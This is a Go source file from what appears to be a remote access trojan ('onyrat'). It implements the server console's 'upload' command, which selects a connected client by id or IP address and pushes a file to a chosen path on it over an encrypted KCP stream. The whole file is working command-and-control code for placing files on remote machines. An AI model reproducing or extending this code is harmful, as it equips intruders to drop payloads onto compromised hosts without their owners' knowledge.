//go:build server
// +build server

package handlers

import (
	"context"
	"fmt"
	"time"

	"github.com/Onyz107/onyrat/pkg/commands/transfer"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/abiosoft/ishell"
)

func RegisterUploadCommand(s *network.KCPServer, shell *ishell.Shell, ctx context.Context) {
	shell.AddCmd(&ishell.Cmd{
		Name: "upload",
		Help: "upload a file to a client",
		LongHelp: `
Usage: upload <id|address> <fileName> <targetPath>

Uploads the specified file from your machine to a client.

Examples:
  upload 1 secret.txt uploaded.txt
  upload 192.168.70.26 report.pdf report.pdf`,

		Func: func(c *ishell.Context) {
			if len(c.Args) < 3 {
				c.Println("Type `upload help` for more information")
				c.HelpText()
				c.Err(fmt.Errorf("not enough arguments"))
				return
			}

			address := c.Args[0]
			if address == "" {
				c.Println("Usage: upload <id|address> <fileName> <targetPath>")
				c.Err(fmt.Errorf("invalid address/id"))
				return
			}

			filename := c.Args[1]
			if filename == "" {
				c.Println("Usage: upload <id|adderss> <fileName> <targetPath>")
				c.Err(fmt.Errorf("invalid filename"))
				return
			}

			targetPath := c.Args[2]
			if targetPath == "" {
				c.Println("Usage: upload <id|adderss> <fileName> <targetPath>")
				c.Err(fmt.Errorf("invalid target path"))
				return
			}

			client, err := getClient(s, address)
			if err != nil {
				c.Println("Failed to get client")
				c.Err(err)
				return
			}

			address = client.Sess.RemoteAddr().String()

			stream, err := getStream(client)
			if err != nil {
				c.Println("Failed to get stream")
				c.Err(err)
				return
			}

			if err := s.SendEncrypted(stream, []byte(c.Cmd.Name), 10*time.Second); err != nil {
				c.Println("Failed to send command to client")
				c.Err(err)
				return
			}

			if err := s.SendEncrypted(stream, []byte(targetPath), 10*time.Second); err != nil {
				c.Println("Failed to send target path to client")
				c.Err(err)
				return
			}

			go func() {
				if err := transfer.Upload(s, client.Manager, filename, ctx); err != nil {
					c.Printf("Failed to download file: %s: %v\n", filename, err)
					return
				}
			}()
		},
	})
}
